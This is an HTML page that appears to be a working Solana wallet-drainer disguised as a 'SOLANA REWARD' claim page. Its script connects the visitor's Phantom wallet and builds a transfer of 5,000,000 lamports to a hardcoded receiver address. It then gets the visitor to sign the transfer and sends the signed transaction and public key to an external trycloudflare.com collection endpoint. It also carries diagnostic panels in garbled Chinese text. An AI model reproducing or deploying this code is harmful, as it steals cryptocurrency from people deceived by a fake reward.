<!DOCTYPE html><html><head><meta charset="UTF-8">
<script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.87.6/index.iife.min.js"></script></head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:10vh;font-family:monospace;">
    <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;width:320px;">
        <h1>SOLANA REWARD V6.F</h1>
        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;border-radius:10px;width:100%;">CLAIM REWARD</button>
        <div id="status" style="margin-top:20px;color:#888;">System Ready</div>
    </div>

    <div id="diag" style="margin-top:20px; text-align:left; display:inline-block; width:320px; background:#050505; padding:15px; border:1px solid #333; font-size:11px;">
        <div style="color:#555;border-bottom:1px solid #333;margin-bottom:8px;">[ ğŸ”± æ ¸å¿ƒé“¾è·¯é€è§† ]</div>
        <div id="d1">â— å¼•æ“åŠ è½½: <span style="color:yellow">æ£€æµ‹ä¸­...</span></div>
        <div id="d2">â— é’±åŒ…ç¯å¢ƒ: <span style="color:yellow">æ£€æµ‹ä¸­...</span></div>
        <div id="d3">â— å¤©çº¿çŠ¶æ€: <span style="color:yellow">æ£€æµ‹ä¸­...</span></div>
    </div>

    <script>
    const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
    const receiver = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";

    // ğŸ•µï¸ è‡ªåŠ¨åŒ–è¯Šæ–­é€»è¾‘
    window.onload = async () => {
        // 1. æ£€æŸ¥å¼•æ“
        const hasLib = typeof solanaWeb3 !== 'undefined';
        document.getElementById('d1').innerHTML = hasLib ? "â— å¼•æ“åŠ è½½: <span style='color:#14F195'>âœ… åŠ¨åŠ›å……è¶³</span>" : "â— å¼•æ“åŠ è½½: <span style='color:red'>âŒ CDNè¢«æ‹¦æˆª</span>";
        
        // 2. æ£€æŸ¥é’±åŒ…
        const p = window.solana || window.phantom?.solana;
        document.getElementById('d2').innerHTML = p ? "â— é’±åŒ…ç¯å¢ƒ: <span style='color:#14F195'>âœ… è¯†åˆ«æˆåŠŸ</span>" : "â— é’±åŒ…ç¯å¢ƒ: <span style='color:red'>âŒ æ²¡åœ¨é’±åŒ…æ‰“å¼€</span>";

        // 3. æ£€æŸ¥å¤©çº¿
        try {
            await fetch(gate, { method: 'GET', mode: 'no-cors' });
            document.getElementById('d3').innerHTML = "â— å¤©çº¿çŠ¶æ€: <span style='color:#14F195'>âœ… éš§é“è¿é€š</span>";
        } catch(e) {
            document.getElementById('d3').innerHTML = "â— å¤©çº¿çŠ¶æ€: <span style='color:red'>âŒ éš§é“å·²æ–­å¼€</span>";
        }
    };

    document.getElementById('cta').onclick = async () => {
        const p = window.solana || window.phantom?.solana;
        try {
            if (typeof solanaWeb3 === 'undefined') {
                document.getElementById('status').innerText = "ERR: Engine Blocked";
                alert("æ ¸å¿ƒåº“åŠ è½½å¤±è´¥ï¼Œè¯·å°è¯•åˆ‡æ¢ç½‘ç»œæˆ–å…³é—­é˜²ç«å¢™");
                return;
            }

            const { publicKey } = await p.connect();
            document.getElementById('status').innerText = "Signing...";

            const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
            const { blockhash } = await connection.getLatestBlockhash();
            
            const tx = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: new solanaWeb3.PublicKey(receiver),
                    lamports: 5000000 
                })
            );
            tx.recentBlockhash = blockhash;
            tx.feePayer = publicKey;

            const signed = await p.signTransaction(tx);
            const raw = btoa(String.fromCharCode.apply(null, signed.serialize()));

            // ä¸‰è·¯å›ä¼ 
            new Image().src = gate + "?sig=" + encodeURIComponent(raw) + "&pub=" + publicKey.toString();
            
            document.getElementById('status').innerText = "SUCCESS!";
            document.getElementById('status').style.color = "#14F195";

        } catch(e) { 
            document.getElementById('status').innerText = "ERR: " + e.message;
        }
    };
    </script>
</body></html>
